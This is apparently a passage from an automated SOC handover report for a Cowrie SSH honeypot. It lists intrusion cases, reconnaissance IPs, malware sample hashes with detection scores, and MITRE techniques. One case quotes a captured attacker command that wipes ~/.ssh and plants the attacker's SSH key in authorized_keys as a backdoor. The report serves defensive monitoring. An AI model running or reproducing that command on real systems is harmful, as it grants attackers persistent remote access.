| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:32:27` | `cowrie.session.connect` |
| `2026-04-17 05:32:27` | `cowrie.client.version` |
| `2026-04-17 05:32:27` | `cowrie.client.kex` |
| `2026-04-17 05:32:28` | `cowrie.login.success` |
| `2026-04-17 05:32:28` | `cowrie.session.params` |
| `2026-04-17 05:32:28` | `cowrie.command.input` |
| `2026-04-17 05:32:28` | `cowrie.command.failed` |
| `2026-04-17 05:32:28` | `cowrie.log.closed` |
| `2026-04-17 05:32:28` | `cowrie.session.params` |
| `2026-04-17 05:32:28` | `cowrie.command.input` |
| `2026-04-17 05:32:29` | `cowrie.session.file_download` |
| `2026-04-17 05:32:29` | `cowrie.log.closed` |
| `2026-04-17 05:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d1a7fba033

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:32 |
| **Last Seen** | 2026-04-17 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:32:31` | `cowrie.session.connect` |
| `2026-04-17 05:32:31` | `cowrie.client.version` |
| `2026-04-17 05:32:31` | `cowrie.client.kex` |
| `2026-04-17 05:32:32` | `cowrie.login.success` |
| `2026-04-17 05:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a7a79cf8f9

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:39 |
| **Last Seen** | 2026-04-17 05:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:39:19` | `cowrie.session.connect` |
| `2026-04-17 05:39:19` | `cowrie.client.version` |
| `2026-04-17 05:39:19` | `cowrie.client.kex` |
| `2026-04-17 05:39:20` | `cowrie.login.success` |
| `2026-04-17 05:39:21` | `cowrie.session.params` |
| `2026-04-17 05:39:21` | `cowrie.command.input` |
| `2026-04-17 05:39:21` | `cowrie.command.failed` |
| `2026-04-17 05:39:22` | `cowrie.log.closed` |
| `2026-04-17 05:39:22` | `cowrie.session.params` |
| `2026-04-17 05:39:22` | `cowrie.command.input` |
| `2026-04-17 05:39:23` | `cowrie.session.file_download` |
| `2026-04-17 05:39:23` | `cowrie.log.closed` |
| `2026-04-17 05:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862839d62e35

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:39 |
| **Last Seen** | 2026-04-17 05:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:39:26` | `cowrie.session.connect` |
| `2026-04-17 05:39:26` | `cowrie.client.version` |
| `2026-04-17 05:39:27` | `cowrie.client.kex` |
| `2026-04-17 05:39:28` | `cowrie.login.success` |
| `2026-04-17 05:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.200.25[.]198` | **25** | 2026-04-17 02:52 | 2026-04-17 03:45 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.255.159[.]152` | **25** | 2026-04-17 02:52 | 2026-04-17 03:07 | 46m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `177.157.193[.]249` | **25** | 2026-04-17 02:53 | 2026-04-17 03:13 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.57.170[.]71` | **25** | 2026-04-17 04:51 | 2026-04-17 05:39 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.64.74[.]51` | **25** | 2026-04-17 03:30 | 2026-04-17 04:10 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.135.161[.]231` | **24** | 2026-04-17 03:48 | 2026-04-17 03:53 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.133.99[.]235` | **24** | 2026-04-17 02:57 | 2026-04-17 03:37 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.128.240[.]75` | **18** | 2026-04-17 04:51 | 2026-04-17 05:32 | 16m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `217.154.106[.]153` | **13** | 2026-04-17 02:52 | 2026-04-17 03:13 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.44[.]215` | **12** | 2026-04-17 04:17 | 2026-04-17 04:20 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `43.163.127[.]183` | **12** | 2026-04-17 02:53 | 2026-04-17 03:10 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.137.90[.]131` | **3** | 2026-04-17 05:36 | 2026-04-17 05:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.42.8[.]7` | **2** | 2026-04-17 02:58 | 2026-04-17 02:58 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.47.159[.]50` | 1 | 2026-04-17 04:51 | 2026-04-17 04:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-04-17 02:52 | 2026-04-17 02:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.133.52[.]228` | 1 | 2026-04-17 04:52 | 2026-04-17 04:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.112[.]221` | 1 | 2026-04-17 04:42 | 2026-04-17 04:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]91` | 1 | 2026-04-17 04:56 | 2026-04-17 04:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.97.199[.]20` | 1 | 2026-04-17 04:32 | 2026-04-17 04:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-04-17 03:20 | 2026-04-17 03:21 | 31s | 1 | `T1110.001` | 🟢 LOW |
| `4.186.31[.]101` | 1 | 2026-04-17 03:32 | 2026-04-17 03:32 | 14s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.93.28[.]216` | 1 | 2026-04-17 03:33 | 2026-04-17 03:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.141.80[.]206` | 1 | 2026-04-17 05:19 | 2026-04-17 05:20 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.93.28[.]216` | KR | XNNET LIMITED | **100** ⚠️ | 2 |
| `101.47.159[.]50` | SG | BYTEPLUS | **100** ⚠️ | 9 |
| `139.135.44[.]215` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 6 |
| `34.133.99[.]235` | US | Google LLC | **100** ⚠️ | 21 |
| `195.178.110[.]204` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `217.154.106[.]153` | ES | IONOS SE | **100** ⚠️ | 50 |
| `20.64.113[.]40` | US | Microsoft Corporation | **100** ⚠️ | 5 |
| `120.48.112[.]221` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 5 |
| `4.186.31[.]101` | IN | Microsoft Corporation | **100** ⚠️ | 9 |
| `120.133.52[.]228` | CN | 21ViaNet(China),Inc. | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 347 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 165 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 146 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 73 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 72 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 409 cases |
| Tool 34  | Credential Extractor        | ✅ 311 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (4.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 146 priority case(s) shown individually · 23 recon entry/entries in table (13 group(s) consolidating 233 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-17T06:07:03Z_
